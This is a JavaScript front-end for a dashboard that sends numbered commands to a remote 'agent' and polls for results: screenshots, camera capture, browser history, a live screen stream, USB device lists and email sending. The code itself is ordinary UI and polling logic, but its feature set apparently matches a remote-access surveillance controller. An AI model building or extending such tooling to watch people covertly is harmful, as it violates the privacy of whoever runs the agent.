// Dashboard logic: click a tool -> create a command -> poll for the result.

const resultEl = document.getElementById("result");
const statusEl = document.getElementById("status");
const emailForm = document.getElementById("emailForm");
const streamToggleWrap = document.querySelector(".stream-toggle");
const streamLoop = document.getElementById("streamLoop");

const TOOL_NAMES = {
    1: "Screenshot", 2: "CPU Info", 3: "Camera",
    4: "Browser History", 5: "Send Email", 6: "Screen Stream",7: "USB Devices",
};

let streaming = false;   // guard so tool 6 doesn't stack loops

function setStatus(text, cls = "") {
    statusEl.textContent = text;
    statusEl.className = "status" + (cls ? " " + cls : "");
}

function setButtonsDisabled(disabled) {
    document.querySelectorAll(".tool").forEach((b) => (b.disabled = disabled));
}

// ---- create a command, then poll until the agent answers -------------------
async function runTool(toolNo, payload = null) {
    setButtonsDisabled(true);
    setStatus(`Running ${TOOL_NAMES[toolNo]}…`, "busy");

    const res = await fetch("/api/command", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ tool_no: toolNo, payload }),
    });
    if (!res.ok) {
        setStatus("Failed to queue command", "err");
        setButtonsDisabled(false);
        return null;
    }
    const { command_id } = await res.json();
    const result = await pollResult(command_id);
    setButtonsDisabled(false);
    return result;
}

async function pollResult(commandId, { attempts = 60, interval = 1000 } = {}) {
    for (let i = 0; i < attempts; i++) {
        const res = await fetch(`/api/result/${commandId}`);
        const data = await res.json();
        if (data.ready) {
            setStatus("Done", "ok");
            renderResult(data);
            return data;
        }
        await sleep(interval);
    }
    setStatus("Timed out — is the agent running?", "err");
    return null;
}

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

// ---- render whatever the agent returned ------------------------------------
function renderResult(data) {
    resultEl.innerHTML = "";
    if (data.content_type === "image") {
        const img = document.createElement("img");
        img.src = data.data.startsWith("data:") ? data.data
                : "data:image/png;base64," + data.data;
        resultEl.appendChild(img);
    } else if (data.content_type === "json") {
        renderJson(data.data);
    } else {
        const pre = document.createElement("pre");
        pre.textContent = data.data;
        resultEl.appendChild(pre);
    }
}

function renderJson(raw) {
    let value;
    try { value = typeof raw === "string" ? JSON.parse(raw) : raw; }
    catch { const pre = document.createElement("pre"); pre.textContent = raw; resultEl.appendChild(pre); return; }

    // Array of flat objects -> table; otherwise pretty-printed JSON.
    if (Array.isArray(value) && value.length && typeof value[0] === "object") {
        resultEl.appendChild(buildTable(value));
    } else {
        const pre = document.createElement("pre");
        pre.textContent = JSON.stringify(value, null, 2);
        resultEl.appendChild(pre);
    }
}

function buildTable(rows) {
    const cols = [...new Set(rows.flatMap((r) => Object.keys(r)))];
    const table = document.createElement("table");
    const thead = table.createTHead().insertRow();
    cols.forEach((c) => { const th = document.createElement("th"); th.textContent = c; thead.appendChild(th); });
    const tbody = table.createTBody();
    rows.forEach((r) => {
        const tr = tbody.insertRow();
        cols.forEach((c) => { tr.insertCell().textContent = r[c] ?? ""; });
    });
    return table;
}

// ---- tool button wiring ----------------------------------------------------
document.querySelectorAll(".tool").forEach((btn) => {
    btn.addEventListener("click", async () => {
        const toolNo = Number(btn.dataset.tool);
        emailForm.hidden = toolNo !== 5;
        streamToggleWrap.hidden = toolNo !== 6;

        if (toolNo === 5) { return; }          // wait for the email form's Send

        if (toolNo === 6) { startStream(); return; }

        await runTool(toolNo);
    });
});

// ---- email form ------------------------------------------------------------
document.getElementById("mailSend").addEventListener("click", async () => {
    const payload = {
        to: document.getElementById("mailTo").value.trim(),
        subject: document.getElementById("mailSubject").value.trim(),
        body: document.getElementById("mailBody").value,
    };
    if (!payload.to) { setStatus("Enter a recipient", "err"); return; }
    emailForm.hidden = true;
    await runTool(5, payload);
});
document.getElementById("mailCancel").addEventListener("click", () => { emailForm.hidden = true; });

// ---- screen "stream": re-request a frame while the toggle is on ------------
async function startStream() {
    if (streaming) return;
    streaming = true;
    do {
        const result = await runTool(6);
        if (!result) break;                    // error/timeout stops the loop
    } while (streamLoop.checked);
    streaming = false;
}

// ---- header actions --------------------------------------------------------
document.getElementById("clearBtn").addEventListener("click", async () => {
    const res = await fetch("/api/commands/clear", { method: "POST" });
    const data = await res.json();
    setStatus(`Cleared ${data.removed} queued command(s)`, "ok");
});
